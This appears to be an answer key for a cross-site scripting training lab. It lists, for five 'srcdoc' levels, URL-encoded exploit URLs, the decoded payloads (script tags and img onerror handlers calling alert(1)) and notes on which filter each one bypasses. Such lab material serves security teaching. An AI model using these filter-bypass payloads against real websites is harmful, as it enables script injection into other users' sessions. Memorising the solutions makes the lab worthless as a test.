# srcdoc — solutions

Reflection into `<iframe srcdoc="...">` — scripts inside srcdoc execute in iframe context.

### srcdoc-level1

`/srcdoc/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw srcdoc reflection — script runs inside iframe

### srcdoc-level2

`/srcdoc/level2/?query=%3Cimg%20src=x%20onerror=alert%26%23x28;1%26%23x29;%3E`

- payload: `<img src=x onerror=alert&#x28;1&#x29;>`
- context: `"` stripped — use unquoted attrs; entity parens decoded inside srcdoc

### srcdoc-level3

`/srcdoc/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: outer `"` HTML-encoded; inside srcdoc the entity-decoded HTML still parses

### srcdoc-level4

`/srcdoc/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: sandbox=allow-scripts still allows JS execution

### srcdoc-level5

`/srcdoc/level5/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `<script>` tag stripped; use img/onerror instead
